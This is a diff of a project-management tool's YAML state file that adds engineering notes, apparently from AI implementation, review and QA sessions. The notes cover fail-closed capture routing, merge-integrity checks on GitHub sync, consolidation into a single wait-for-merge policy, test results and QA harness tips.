+    text: 'QA S5 (2026-10-27, 1790ebc7): PASS, all 3 stories live. Spec gotcha: qa.md
+      S5 proxy launch `cd $SB && ... nohup python3 ... &` makes $! the subshell pid,
+      so `kill <pid>` leaves the proxy running. Use `cd $SB; ... &` or pgrep the python
+      pid. Also, the mandated `git config --global user.*` overwrites the container
+      identity, so restore it after.'
+    created_at: '2026-10-27T18:26:14Z'
+    last_edited: '2026-10-27T18:26:14Z'
+  - id: note-c902155
+    text: 'Design constraint from pr-748e708 (workdir-keyed push proxies, in review):
+      the proxy now rejects any request whose "workdir" differs from its own workdir
+      (spec R4), and each host workdir gets its own proxy/socket. So the "git proxy
+      forwards pull/fetch/push from any repo to the scenario workdir" bug cannot be
+      fixed by making the wrapper send the container cwd - that request will be rejected
+      with an explicit git-proxy: rejected message. The compatible fix is wrapper-side:
+      only forward to the proxy when the command runs in the mounted repo (/workspace),
+      and otherwise exec real git (which fails cleanly without credentials) or fail
+      with a clear message. Serving arbitrary workdirs per request is the deferred
+      option (3) in pr-748e708 spec. (2026-10-27)'
+    created_at: '2026-10-27T17:08:54Z'
+    last_edited: '2026-10-27T17:08:54Z'
+  model: provider:claude-work
+  session_models:
+    impl: provider:claude-work
+    review: provider:claude-work
+    qa: provider:claude-work
+    qa_planning: provider:claude-work
+    qa_scenario: provider:claude-work
+    qa_concretize: provider:claude-work
+    qa_verification: provider:claude-work
+    qa_finalize: provider:claude-work
+    qa_interactive: provider:claude-work
+    signoff: provider:claude-work
+    merge: provider:claude-work
 - id: pr-22c92ef
   plan: bugs
   title: 'Bug: status bar clips "AUTO ×N" to "AUTO …" when the TUI pane is ~40 cols
@@ -33484,11 +34868,52 @@ prs:
   gh_pr: null
   gh_pr_number: null
   created_at: '2026-10-13T15:27:51.803055+00:00'
-  updated_at: '2026-10-13T15:27:51.803055+00:00'
+  updated_at: '2026-10-27T19:06:15.156875+00:00'
   started_at: null
   reviewed_at: null
   merged_at: null
-  notes: []
+  notes:
+  - id: note-0af873b
+    text: 'Launch handoff from user-approved critical-bug review, 2026-10-27: current
+      captures_dir still accepts any PR when PM_CAPTURES_PR is absent. Keep this fix
+      narrowly on fail-closed capture routing for absent/empty/mismatched owner markers
+      while preserving matching-owner and legitimate host fallback behavior. Exercise
+      nested throwaway fixtures with separate captures and preserve existing real
+      evidence. Broader PR/run evidence ownership remains tracked separately in pr-1ae1d2d.'
+    created_at: '2026-10-27T18:43:33Z'
+    last_edited: '2026-10-27T18:43:33Z'
+  - id: note-7b79f85
+    text: 'Impl 2026-10-27 (2739187c, pushed): captures_dir now fails closed. The
+      mount is used only when PM_CAPTURES_PR (whitespace-stripped) equals pr_id; absent/empty/mismatched
+      markers fall back to the per-session host path, or None when no tag resolves
+      — never /pm-captures. Matching-owner routing, host-first precedence and container.create_container
+      (-v mount + -e marker) are unchanged; legacy containers created without the
+      marker now write to their container-local ~/.pm instead of the mount (recoverable
+      loss vs. unrecoverable overwrite — deliberate per note-0af873b). Evidence in
+      impl/pre-fix/ and impl/post-fix/: sandboxed repro (unshare bind over /pm-captures,
+      real evidence untouched) shows a nested throwaway project with PM_CAPTURES_PR
+      unset overwriting the enclosing PR''s scenarios/1 evidence pre-fix and landing
+      in its own ~/.pm/sessions/<nested-tag>/captures/pr-nested1 post-fix, with the
+      owning PR still resolving /pm-captures as a positive control. tests/test_captures_dir_mount.py:
+      12 tests (5 failed pre-fix for the mount being returned). Full suite: 3747 passed;
+      the 60 failures in test_git_ops/test_merge_publish/test_signoff_integration/test_hook_events
+      are identical on the pre-fix tree (environment: git in this sandbox). Spec:
+      pm/specs/pr-1e9c117/impl.md.'
+    created_at: '2026-10-27T19:06:15Z'
+    last_edited: '2026-10-27T19:06:15Z'
+  model: provider:deepseek-flash
+  session_models:
+    impl: provider:deepseek-flash
+    review: provider:deepseek-flash
+    qa: provider:deepseek-flash
+    qa_planning: provider:deepseek-flash
+    qa_scenario: provider:deepseek-flash
+    qa_concretize: provider:deepseek-flash
+    qa_verification: provider:deepseek-flash
+    qa_finalize: provider:deepseek-flash
+    qa_interactive: provider:deepseek-flash
+    signoff: provider:claude-work
+    merge: provider:deepseek-flash
 - id: pr-dc4dd45
   plan: bugs
   title: 'Bug: trust-blocked message for an approved pm workdir tells the user to
@@ -35141,7 +36566,7 @@ prs:
   gh_pr: null
   gh_pr_number: null
   created_at: '2026-10-22T00:26:04.150027+00:00'
-  updated_at: '2026-10-22T01:38:54.583871+00:00'
+  updated_at: '2026-10-27T21:45:52.566741+00:00'
   started_at: null
   reviewed_at: null
   merged_at: null
@@ -35154,6 +36579,125 @@ prs:
       PR pr-bbac94b detected as merged"). Evidence /pm-captures/scenarios/13/when5-plain-merge-pr5/tui-sync-finalized-pr5.log.'
     created_at: '2026-10-22T01:38:54Z'
     last_edited: '2026-10-22T01:38:54Z'
+  - id: note-1c62905
+    text: 'Impl session (2026-10-27): fix implemented + pushed addf8b40. Sync-detected
+      GitHub merges (TUI background do_normal_sync -> pr_sync.sync_prs, TUI startup
+      -> sync_from_github, and CLI `pm pr sync`) now verify against the bound SIGNOFF_MERGE
+      via shared pm_core/merge_integrity.py (extracted from cli/pr.py::_verify_github_merge).
+      A mismatch records merge_integrity + one note (same text/shape as pm pr merge)
+      and shows a held TUI log line; an unverifiable merge is logged and finalized
+      unchanged. TUI worker thread still does reads only; evidence applied in the
+      main thread locked_update. Evidence: /pm-captures/impl/pre-fix (repro: merged,
+      no integrity/note), /pm-captures/impl/post-fix (integrity+note on both TUI paths;
+      approved-merge control clean), /pm-captures/impl/test-evidence/full-suite.log
+      (3832 passed, 1 skipped; pytest 8.4.2). New tests: tests/test_sync_merge_integrity.py
+      (9). Ready for review; the base pm TUI session is not reachable from this container,
+      so review was not launched here.'
+    created_at: '2026-10-27T20:04:42Z'
+    last_edited: '2026-10-27T20:04:42Z'
+  - id: note-e5a6965
+    text: 'Review loop c703 i1 (2026-10-27): reviewed addf8b40 — fix is correct and
+      complete for all three sync paths; pre/post captures under /pm-captures/impl
+      are convincing and the new tests fail on pre-fix code for the right reason.
+      Pushed c8171867 with review fixes: verify_detected_merge now never raises (single
+      guard; pr_sync + `pm pr sync` call sites simplified), _recover_completed_merge
+      reuses merge_integrity.approved_candidate, `pm pr sync-github` prints the same
+      WARNING as `pm pr sync`, git_detail/_log_merge_integrity dedupe, and 4 added
+      tests (no-approval, legacy unbound approval, verification crash still finalizes,
+      sync-github output). Full suite 3836 passed, 1 skipped (pytest 8.4.2) — log
+      at /pm-captures/review-c703-i1/full-suite.log. Not changed / for QA: the TUI
+      sync thread now runs integration.fetch_base (git fetch into a workdir, serialized
+      by integration.pm-integration.lock, up to 300 s wait) per detected merge.'
+    created_at: '2026-10-27T20:27:27Z'
+    last_edited: '2026-10-27T20:27:27Z'
+  - id: note-7353e31
+    text: 'Review loop c703 i2 (2026-10-27): reviewed c8171867 and pushed 92f073da.
+      The i1 fix holds: all three sync paths (TUI background do_normal_sync, TUI startup
+      sync_from_github, CLI pm pr sync / sync-github) verify against the bound SIGNOFF_MERGE,
+      record merge_integrity + one note, and never let a failed check stop merge detection.
+      i2 changes: (1) merge_integrity.apply_to_pr(pr, verification) takes the MergeVerification
+      and no-ops for None/ok/error, replacing the repeated `verified is not None and
+      verified.problem` guard at five call sites; (2) git_detail moved to pm_core/git_ops.py
+      (generic git-output formatter, used by the publish path too); (3) the "no merge
+      commit of the approved head" problem now names the PR (sync log lines lack pm
+      pr merge''s "GitHub PR #N merged." context); (4) pm pr sync no longer stashes
+      could-not-verify results it never applied; (5) named _INTEGRITY_HOLD_SECONDS.
+      Tests added: workdir-gone fallback verifies against the project repo (records
+      the general "did not publish the signed-off candidate" because the project repo
+      lacks the PR head object for is_ancestor), save_state=False worker writes nothing,
+      and pm pr sync''s could-not-verify branch warns without recording. Full suite
+      3838 passed, 1 skipped (pytest 8.4.2). Still for QA (unchanged from i1): the
+      TUI sync worker thread runs integration.fetch_base once per detected merge of
+      a bound-approved PR, serialized by <git-common-dir>/pm-integration.lock with
+      a 300 s bound, so a merge detected while another integration check holds that
+      lock delays the background sync (status bar stays "pulling"); PRs without a
+      bound approval never fetch.'
+    created_at: '2026-10-27T20:53:45Z'
+    last_edited: '2026-10-27T20:53:45Z'
+  - id: note-ac730c2
+    text: 'Review loop c703 i3 (2026-10-27): reviewed f0891fe5 and pushed 7c761cf8.
+      The i2 fix holds: all three sync paths verify sync-detected merges against the
+      bound SIGNOFF_MERGE, record merge_integrity + one note, and a failed check never
+      stops merge detection; the pre/post captures under /pm-captures/impl remain
+      convincing. i3 changes (no verifier behavior change): (1) the three inline `getattr(result,
+      "merge_integrity", None) or {}` copies in pm_core/tui/sync.py became one `_result_integrity`
+      helper — the default is required because tests/test_log_message_force.py stubs
+      the sync result with a SimpleNamespace that lacks the attribute (dropping the
+      getattr broke 2 tests; full suite caught it); (2) `pm pr sync-github`''s could-not-verify
+      warning now names the PR like `pm pr sync` and the log line; (3) the TUI tests
+      now assert the warning is logged force=True with hold=_INTEGRITY_HOLD_SECONDS
+      (spec R3''s held line was previously untested); (4) new test for sync_prs''s
+      workdir-gone fallback (verification runs in the workdir sync detected from,
+      with the project repo pulled so a real mismatch is named). Full suite 3839 passed,
+      1 skipped (pytest 8.4.2) — /pm-captures/review-c703-i3/full-suite.log. Still
+      for QA (unchanged): the TUI sync worker thread runs integration.fetch_base once
+      per detected merge of a bound-approved PR, serialized by <git-common-dir>/pm-integration.lock
+      with a 300 s bound, so a merge detected while another integration check holds
+      that lock delays the background sync (status bar stays "pulling"); PRs without
+      a bound approval never fetch. Known limitation (inherited from pr-ac10f03, deliberate):
+      when the PR workdir is gone and the fallback fetch source (a local project repo)
+      is stale and does not show the merge, the verifier records the general "did
+      not publish the signed-off candidate" problem rather than "could not verify"
+      — correct for a GitHub-URL repo, possible noise for a local mirror. (2026-10-27T21:20:00Z)'
+    created_at: '2026-10-27T21:18:11Z'
+    last_edited: '2026-10-27T21:18:11Z'
+  - id: note-fb11b36
+    text: 'Review loop d49c i1 (2026-10-27): reviewed 1237f48d (i3 state) and pushed
+      13ece19c. i3 holds: all three sync paths verify detected merges against the
+      bound SIGNOFF_MERGE via pm_core/merge_integrity.py, record merge_integrity +
+      one note, never let a failed check stop merge detection; pre/post captures under
+      /pm-captures/impl remain convincing and the new tests still fail on pre-fix
+      code for the right reason. i1 change (one verifier-neutral fix): the startup/sync-github
+      callbacks (tui/sync.py::apply_github and pr_sync.sync_from_github::apply) applied
+      the verification only when the fresh state still showed a different status.
+      The sync verifies from its own possibly-stale copy, so a concurrent writer can
+      finalize the status first, leaving the log line but no persistent record. Both
+      now apply the evidence whenever the sync new status is merged (idempotent; note
+      dedupe), matching spec R3 and the other two sync paths. Tests added: failing-then-passing
+      race tests for both callbacks (verified they fail pre-fix: KeyError merge_integrity)
+      and a pm pr sync approved-merge control (no record/note/WARNING). Full suite
+      3842 passed, 1 skipped (pytest 8.4.2) — /pm-captures/review-d49c-i1/full-suite.log.
+      Still for QA (unchanged): the TUI sync worker thread runs integration.fetch_base
+      once per detected merge of a bound-approved PR, serialized by <git-common-dir>/pm-integration.lock
+      with a 300 s bound; PRs without a bound approval never fetch.'
+    created_at: '2026-10-27T21:45:52Z'
+    last_edited: '2026-10-27T21:45:52Z'
+  model: provider:deepseek-flash
+  effort: high
+  session_models:
+    impl: provider:deepseek-flash
+    review: provider:deepseek-flash
+    qa: provider:deepseek-flash
+    qa_planning: provider:deepseek-flash
+    qa_scenario: provider:deepseek-flash
+    qa_concretize: provider:deepseek-flash
+    qa_verification: provider:deepseek-flash
+    qa_finalize: provider:deepseek-flash
+    qa_interactive: provider:deepseek-flash
+    merge: provider:deepseek-flash
+    signoff: provider:claude-work
+  session_effort:
+    signoff: high
 - id: pr-0368986
   plan: bugs
   title: 'Bug: prompts tell sessions to run ''pm pr show'', which does not exist'
@@ -37081,6 +38625,847 @@ prs:
   gh_pr_number: null
   created_at: '2026-10-27T01:30:16.482567+00:00'
   updated_at: '2026-10-27T01:30:16.482567+00:00'
+  started_at: null
+  reviewed_at: null
+  merged_at: null
+  notes: []
+- id: pr-25f4038
+  plan: bugs
+  title: Use wait-for-merge as the only manual autostart merge policy
+  branch: pm/pr-25f4038-use-wait-for-merge-as-the-only-manual-autostart-me
+  status: in_progress
+  depends_on: []
+  description: 'The two manual-merge policies are unnecessarily confusing: stop_before_merge
+    holds only the selected target while prerequisites may auto-merge, whereas wait_for_merge
+    holds the target and all transitive prerequisites until the user merges them.
+    The user explicitly requested removing stop-before-merge and using wait-for-merge
+    instead, including the O key and all other bindings that currently select stop-before-merge.
+
+
+    Use wait_for_merge as the single manual-merge policy throughout the scheduler,
+    CLI, TUI command bar, O/auto-sequence and other affected bindings, runs popup,
+    help, watcher prompts, serialization and documentation. New CLI targets and O
+    must select wait_for_merge. A target and all of its unmerged transitive prerequisites
+    must run implementation -> review -> required QA -> fresh sign-off, then wait
+    for an explicit user merge; merging a prerequisite automatically starts newly
+    unblocked dependents. Do not change a merge hold into a pause before sign-off
+    or require re-arming after every manual merge.
+
+
+    Remove the distinct stop_before_merge state/semantics and user-visible stop-before-merge
+    choice. Migrate saved target policies, old per-PR stop marks and restart breadcrumbs
+    safely and idempotently to wait_for_merge semantics, including dependencies and
+    shared targets. Old stop-before-merge CLI/command-bar inputs may be accepted as
+    a deprecated compatibility alias to wait-for-merge if needed, but must not preserve
+    a separate target-only hold or silently drop the manual gate. Do not let an old-client
+    response, stale persisted field, removed target or mixed-version breadcrumb silently
+    permit a merge. Keep explicitly selected auto-merge as the separate opt-in automatic
+    policy; this request consolidates the two manual-merge options, rather than changing
+    explicit auto-merge authorization.
+
+
+    Preserve source, dirty workdirs, running agents, evidence, model assignments,
+    spec-review settings and unrelated targets. Migration must never merge a PR, resume
+    held/completed QA, launch a duplicate session, or consume stale sign-off. Shared
+    prerequisites remain held whenever any active wait-for-merge target needs them.
+    Removing or changing one target releases only the holds it owns; other manual
+    holds remain effective. Preserve standalone manual holds even when interpreting
+    legacy records.
+
+
+    Acceptance: cover O and all affected bindings, default CLI add, explicit wait-for-merge,
+    legacy stop-before-merge inputs/data, restart migration, repeated commands, multiple
+    targets with shared/diamond dependencies, dependency edits, removal and manual
+    merging through a chain. Verify fresh sign-off is still required, a prerequisite
+    never auto-merges under the manual policy, and its manual merge schedules the
+    next ready work exactly once. Exercise a live isolated TUI/CLI fixture in addition
+    to focused regressions. Update explanatory text and status output so one manual
+    policy is presented consistently.
+
+
+    Related concurrently running PR #260/pr-22ea6a2 adds the explicit z a fresh-autostart
+    implementation handoff. Preserve that feature''s live-session adoption, new-handoff
+    boundary and existing merge gate while updating any manual-policy choice it introduces.
+    Coordinate at integration/review rather than editing its workdir or depending
+    on unfinished code. Do not reset or operate on the user''s #253 as part of this
+    feature''s development. User authorized starting this PR with DeepSeek1017/high;
+    work Opus5.5/high sign-off and wait_for_merge are required for this PR itself.'
+  agent_machine: spark-424d
+  gh_pr: https://github.com/mjtomei/project_manager/pull/261
+  gh_pr_number: 261
+  created_at: '2026-10-27T04:42:06.128850+00:00'
+  updated_at: '2026-10-27T15:48:29.788461+00:00'
+  started_at: '2026-10-27T04:42:19.589247+00:00'
+  reviewed_at: null
+  merged_at: null
+  notes:
+  - id: note-41497eb
+    text: 'Impl: stop_before_merge removed; wait_for_merge is the only manual policy.
+      Default CLI/command-bar adds and O now select wait_for_merge; --stop-before-merge
+      is a deprecated alias (mapped to wait, never a target-only hold). Breadcrumb/legacy
+      record migration is fail-closed (standalone stop marks become wait targets;
+      legacy single target -> wait; malformed fields cannot enable all-mode). Related
+      PR #260 / pr-22ea6a2 adds the z a fresh-autostart handoff and may introduce
+      a manual-policy choice: at integration, map any stop-before-merge choice to
+      wait_for_merge and preserve its live-session adoption, new-handoff boundary
+      and merge gate. Do not edit that workdir.'
+    created_at: '2026-10-27T05:21:53Z'
+    last_edited: '2026-10-27T05:21:53Z'
+  - id: note-678d953
+    text: 'Impl complete and pushed (87275002). Focused suites: 245 passed. Full suite:
+      3722 passed; the only failures are pre-existing environment issues (missing
+      markdown module; test_git_ops/test_hook_events; test_signoff_integration/test_merge_publish
+      also fail on the base commit). Captures: /pm-captures/impl/{pre,post}-fix/stop-before-merge.
+      `pm pr review` could not run in this container: the GitHub backend requires
+      gh (not installed) and there is no TUI/tmux session, so the PR remains in_progress
+      — launch review from the host.'
+    created_at: '2026-10-27T05:26:44Z'
+    last_edited: '2026-10-27T05:26:44Z'
+  - id: note-da8d632
+    text: 'review-loop 82bf i1: legacy record migration now fails closed for any non-auto
+      `policy`/`merge_policy` value (incl. empty/None) and record-field migrations
+      are reported in the restart log ("migrated legacy breadcrumb"); bare-string
+      target entries flagged as legacy; added regressions (empty/None/auto-merge policy
+      values, migrated flag, bare strings, stop marks dropped when auto-start was
+      off); synced pm/specs/pr-25f4038/impl.md (target_policy signature, auto-start-off
+      stop marks) and clarified CLI/O policy wording. Full suite: 3762 passed; the
+      only failures (missing markdown module, test_git_ops/test_hook_events, test_signoff_integration/test_merge_publish)
+      are identical on base 450a6362.'
+    created_at: '2026-10-27T05:49:50Z'
+    last_edited: '2026-10-27T05:49:50Z'
+  - id: note-3ea78dd
+    text: 'review-loop 82bf i2: fail closed on bare-string breadcrumb target entries
+      (unknown policy -> wait_for_merge, source=legacy-breadcrumb) instead of silently
+      auto-merging; refreshed stale docstrings in signoff_ui/review_loop_ui that still
+      described the removed "ready to merge"/stop line; spec R4 synced. Focused suites:
+      254 passed; full suite unchanged vs base (only pre-existing env failures: markdown/gh/git-push).'
+    created_at: '2026-10-27T06:12:37Z'
+    last_edited: '2026-10-27T06:12:37Z'
+  - id: note-244e1db
+    text: 'review-loop 82bf i3: fail-closed hardening. targets_from_breadcrumb no
+      longer falls back to the legacy "all ready PRs" inference when current-format
+      keys exist without a usable targets list (targets: null, or all_mode present
+      with no targets): only a literal all_mode:true is honored, so a corrupt/mixed-version
+      breadcrumb cannot enable whole-backlog auto-merge. add_targets now alias-maps
+      and validates default_policy too (a bad default could silently drop a manual
+      gate). New regressions (7); focused 261 passed; full suite 3769 passed with
+      only pre-existing env failures (missing markdown/gh, git push-proxy PATH trap).'
+    created_at: '2026-10-27T06:30:28Z'
+    last_edited: '2026-10-27T06:30:28Z'
+  - id: note-de61e90
+    text: 'review-loop 77f6 i1: legacy stop-id parsing is now order-stable for set/dict
+      inputs (deterministic migrated target order); added the missing regression for
+      a target that is itself a prerequisite of another wait target (removing it keeps
+      the hold + scope from the remaining target). Focused suites: 262 passed. Full
+      suite: 3782 passed; only pre-existing env failures (test_git_ops::test_keeps_unpushed_merge,
+      test_hook_events, test_merge_publish, test_signoff_integration) — identical
+      on base 450a6362. New policy tests fail on base (33/42), confirming they catch
+      the old behaviour.'
+    created_at: '2026-10-27T07:06:07Z'
+    last_edited: '2026-10-27T07:06:07Z'
+  - id: note-bb9d108
+    text: 'review-loop 77f6 i3: corrupt-breadcrumb consistency + regression coverage.
+
+
+      - targets_from_breadcrumb: a non-list `targets` value (dict/str/int) now takes
+      the same branch as `targets: null` — drop the unusable list, honour only a literal
+      `all_mode: true` — removing a redundant branch that made the two corrupt shapes
+      behave differently. Spec R4 updated ("all three shapes handled identically").
+
+      - Added regressions: non-list `targets` x `all_mode` true/false (3 shapes),
+      and deterministic sorted order for legacy `stop_before_merge` ids arriving as
+      a set / mapping keys (the i1 sorting had no test).
+
+      - build_status reads the stale `stop_before_merge` input once instead of twice.
+
+      - Spec synced: accepted auto values (`auto_merge`/`auto-merge`), falsy `wait_for_merge`
+      reported as legacy, unordered legacy stop ids sorted.
+
+
+      Focused suites: 266 passed. Full suite: 3774 passed; the only failures are the
+      pre-existing env set (missing markdown module; test_git_ops::test_keeps_unpushed_merge
+      — flaky push-proxy, also fails on base; test_hook_events; test_merge_publish;
+      test_signoff_integration). pm pr review cannot run in this container (no gh,
+      no TUI session) — launch review from the host.'
+    created_at: '2026-10-27T07:50:29Z'
+    last_edited: '2026-10-27T07:50:29Z'
+  - id: note-a85ee22
+    text: 'Integration note for #260/pr-22ea6a2 (the `z a` fresh-autostart handoff):
+      its `reset_pr` persists `pr[FRESH_KEY]["policy"] = policy or POLICY_STOP` in
+      project.yaml, and `resume_fresh` reads it back (`policy = fresh_marker(pr).get("policy")
+      or POLICY_STOP`, then `if policy not in POLICIES: policy = POLICY_STOP`). After
+      this PR there is no POLICY_STOP: at integration map any persisted/marker `stop_before_merge`
+      value (and `z O` / `--stop-before-merge`) to POLICY_WAIT, make fresh_start default_policy
+      POLICY_WAIT, and fail closed on an unknown marker policy instead of defaulting
+      to the removed constant. Preserve that PR''s live-session adoption, new-handoff
+      boundary and merge gate; do not edit its workdir.'
+    created_at: '2026-10-27T08:02:46Z'
+    last_edited: '2026-10-27T08:02:46Z'
+  - id: note-83308cc
+    text: 'review-loop 77f6 i5: empty-string breadcrumb targets are now dropped (and
+      reported as a corrupt/legacy shape) instead of becoming a target with no id;
+      added regressions for that and for the `pm tui keys` O wording (R6); fixed a
+      stale "stops before merge" section comment in cli/pr.py; spec gains the #260/pr-22ea6a2
+      fresh-marker integration section. Focused suites 268 passed; full suite 3776
+      passed with only the pre-existing env failures (no gh / no markdown module /
+      local-repo fetch: test_signoff_integration 22, test_merge_publish 19+17, test_markdown_render
+      12, test_hook_events, test_git_ops — identical set on base 450a6362).'
+    created_at: '2026-10-27T08:24:32Z'
+    last_edited: '2026-10-27T08:24:32Z'
+  - id: note-52a6dd7
+    text: 'QA scenario 6 (auto-merge opt-in, wait/auto policy flips) PASSED all 3
+      stories. Env note for the next QA run: start `pm session` with the real git
+      ahead of the push-proxy wrapper — `export PATH=/tmp/pm-venv/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/local/sbin:$HOME/.local/bin`
+      AFTER activating the venv. Otherwise `~/.local/bin/git` forwards the local integration
+      `git fetch` to the host proxy, every SIGNOFF_MERGE is coerced to SIGNOFF_BLOCKED
+      ("does not appear to be a git repository"), and story 1/2 never reach a merge.
+      Captures: /pm-captures/scenarios/6/{story1,story2,story3}.'
+    created_at: '2026-10-27T09:47:28Z'
+    last_edited: '2026-10-27T09:47:28Z'
+  - id: note-3ce3840
+    text: 'QA scenario 5 (shared prerequisites/diamonds/removal/dep edits) refinable
+      and verified end-to-end on a throwaway local-backend project. Harness traps:
+      (1) activate the venv FIRST, then export PATH=/tmp/pm-venv/bin:/usr/bin:/bin:$HOME/.local/bin
+      and start pm session with it — ~/.local/bin/git proxies fetch/push, so sign-off
+      integration fails ("<TEST_DIR> does not appear to be a git repository") and
+      every SIGNOFF_MERGE is coerced to BLOCKED; (2) pm pr start refuses until `pm
+      push` and the printed pm/sync-* branch are merged into master; (3) fake-claude
+      impl writes no commit, so seed a distinct commit in each workdir before sign-off
+      (else integration is in_base -> BLOCKED). Holds/removal/dep-edit assertions
+      are all visible in `pm autostart status`/`list`; count windows with `tmux list-windows
+      -t <session>`, not -a (grouped ~1 session double-counts).'
+    created_at: '2026-10-27T09:27:21Z'
+    last_edited: '2026-10-27T09:27:21Z'
+  - id: note-a0cc12e
+    text: 'QA scenario 5 (shared prerequisites/diamonds/removal/dep edits): PASS on
+      e31a9823, no code change. All five stories verified live on two throwaway local-backend
+      projects: A+B held at fresh sign-off under wait-for-merge target F; U never
+      scheduled (absent from status, pending in list, no window); merge A -> C starts
+      (1 window), D still blocked on B, U still absent; merge B -> D starts (1 window),
+      C still 1, no duplicates; A held by two targets shows "wait-for-merge <- F,
+      G" + "(held by F, G)"; `pm autostart remove F` printed exactly "released merge
+      hold: E, F" (A not listed) and A stayed held by G; removing A as a target printed
+      no released line and A kept its hold from F and G; dep edits moved B into/out
+      of F closure without killing its window. Captures: /pm-captures/scenarios/5/{story1-diamond-hold,story2-4-multitarget-removal-depedit}
+      (cast+mp4+manifest; the same-filename first attempt is archived under story1-fixture-flaw-same-file).
+
+
+      Harness traps for the next run: (1) seed A and B with DISTINCT FILENAMES (impl-<id>.txt),
+      not just distinct contents — the same path in both branches conflicts at the
+      second merge and coerces B to SIGNOFF_BLOCKED; (2) merging A moves master, so
+      the next held PR''s `pm pr merge` is refused once ("master moved since sign-off")
+      and the loop re-signs it automatically — the scenario''s "merge B" step needs
+      a short wait then a retry, not a code fix; (3) fake impl writes no commit, so
+      dependents C/D/E end "sign-off BLOCKED" (in_base) — they only need to START,
+      which they do; (4) resize the TUI window to 200x50 before `pm tui view`, else
+      the hold line clips at 80 cols; `pm tui view` shows the most recent event line,
+      not a chosen PR.
+
+
+      Incidental (pre-existing, out of this PR scope) bug filed as pr-16e45ba: a PR
+      flipped back to in_review after a completed review loop sticks at "awaiting
+      sign-off (hand-off on next scheduler pass)" — same skip-if-completed logic exists
+      on master.'
+    created_at: '2026-10-27T09:54:14Z'
+    last_edited: '2026-10-27T09:54:14Z'
+  - id: note-31b01c6
+    text: 'QA S5 capture follow-up (corrects the artifacts, not the verdict): both
+      recording.mp4 files were initially GIFs renamed to .mp4 — agg writes GIF regardless
+      of the output extension, and the ffmpeg encode step had been skipped. Re-encoded
+      both with agg -> ffmpeg -vf "scale=trunc(iw/2)*2:trunc(ih/2)*2" -c:v libx264
+      -pix_fmt yuv420p -movflags +faststart (the scale filter is required: agg canvas
+      1703x1000 has an odd width that libx264 rejects); verified codec_name=h264 +
+      ftyp box + a decoded frame. Story 1 was also re-recorded in a fresh project
+      (/tmp/pm-qa5-NqWi) driving A to sign-off alone first, so `pm tui view` shows
+      A own footer "✓ pr-05c47f7 signed off (SIGNOFF_MERGE @ 27624fb7) — waiting for
+      manual merge (wait-for-merge: pr-90419ae) — press ''g'' to merge" (the earlier
+      take only ever showed B line because both signed off together). All story-1
+      Thens re-verified there: C=1 U=0 after merging A; B first merge refused once
+      by the stale-approval guard then auto-re-signed and merged; C=1 D=1 U=0 afterwards.
+      Both manifests now state the real encoding chain.'
+    created_at: '2026-10-27T11:23:16Z'
+    last_edited: '2026-10-27T11:23:16Z'
+  - id: note-74d564b
+    text: 'QA scenario 9 (legacy saved-state migration) PASS on aa41c612. All four
+      stories verified live in a throwaway local-backend project (/scratch/pm-test-1793114422,
+      18 fixture PRs, fake-claude no-verdict config): (1) legacy policy fields — policy=stop_before_merge,
+      merge_policy=wait_for_merge, policy="", policy=something_new, stop_before_merge=true
+      — plus wait_for_merge:false and policy=auto_merge all land in file order; the
+      five ambiguous ones become wait_for_merge and hold the shared prerequisite,
+      the two explicit auto records stay auto_merge; migrated_legacy=True and "(migrated
+      legacy breadcrumb)". (2) stop_before_merge as a mapping + bare-string + empty-string
+      target entries: exactly four targets [BARE, TARGET2, ALPHA, ZETA], stop-only
+      ids appended in ascending pr-id order, ALPHA/ZETA source=legacy-stop, BARE source=legacy-breadcrumb,
+      merged/closed ids dropped, no phantom row. (3) stop_before_merge as a bare string
+      naming a non-target: OTHER stays auto_merge/held_by=[], NONTARGET3 becomes a
+      standalone wait target blocking BASE3. (4) pm tui restart --breadcrumb: migrated_legacy=False,
+      no migration note, before/after JSON identical (ids, order, policy, effective_policy,
+      held_by, run window ids), window list unchanged. Focused tests tests/test_autostart_single_manual_policy.py
+      + tests/test_autostart_multi_target.py: 150 passed. Captures: /pm-captures/scenarios/9/story{1-migration,2-idless-and-stop-map,3-bare-string-stop,4-idempotent-restart}
+      (cast+mp4+manifests). Harness note: observed log tag is `[tui] log:` not `[tui.app]
+      log:`; `L` in the TUI launches a separate log pane (kill the pane to restore
+      full width); tmux send-keys to a freshly created drive window works, but capture-pane
+      on it shows content at the TOP of a 50-row pane, so grep for non-blank lines
+      instead of `tail`.'
+    created_at: '2026-10-27T15:30:36Z'
+    last_edited: '2026-10-27T15:30:36Z'
+  - id: note-ca9035c
+    text: 'QA S8 PASS on aa41c612 (native, local backend, fake review/QA/sign-off).
+      Live evidence: O on target F arms wait-for-merge (never auto-merge); dependency
+      A holds at fresh sign-off ("✓ … waiting for manual merge (wait-for-merge: F)");
+      g merges A once and starts F exactly once (U untouched); F own sign-off waits
+      for manual merge with no re-arming; g on F merges once and logs "all targets
+      complete — auto-start OFF" with full window cleanup; a HEAD move on held A is
+      refused ("recorded sign-off verdict SIGNOFF_MERGE is stale (HEAD moved since)"),
+      the row shows "SIGNOFF_MERGE stale (HEAD moved); sign-off relaunches against
+      current HEAD", and A returns to the hold only after a fresh re-sign. Focused
+      suite tests/test_autostart_single_manual_policy.py: 48 passed. Captures: /pm-captures/scenarios/8/{story1-arming-and-hold,story2-merge-a-starts-f,story3-f-waits,story4-merge-f-complete,story5-stale-signoff-gate}.
+      Harness caveat: the fake qa_planning session never writes the Step-0 QA spec,
+      so fake-driven QA pauses INPUT_REQUIRED until `pm pr spec <id> qa` + `z t` re-run;
+      pre-generate the spec as soon as the impl workdir appears. Also `pm pr select
+      <id>` updates active_pr but does not move the TUI cursor — navigate with h/l
+      and confirm the double border.'
+    created_at: '2026-10-27T15:42:45Z'
+    last_edited: '2026-10-27T15:42:45Z'
+  - id: note-7a28d9a
+    text: 'QA scenario 0 (interactive, resumed after host restart) — fresh native
+      run on aa41c612; no code change. Covered the policy surface the worker scenarios
+      don''t: plain `pm autostart add` → wait-for-merge (status `wait-for-merge ←
+      target`); re-add keeps auto; `--wait-for-merge` flips; `--stop-before-merge`
+      maps to wait alone and when combined with `--wait-for-merge`; either + `--auto-merge`
+      → conflicting_flags, target set unchanged; `autostart --help`, `add --help`,
+      `pm tui keys`, `?` help and the runs popup present one manual policy with `--stop-before-merge`
+      only as a deprecated alias. Shared holds/removal/dep edits: two targets hold
+      one prerequisite (`wait-for-merge ← F, G`); removing one prints only its own
+      released ids; removing a target that is another target''s prerequisite keeps
+      the other hold; dep add/remove moves the hold. Auto paths: an auto target merges
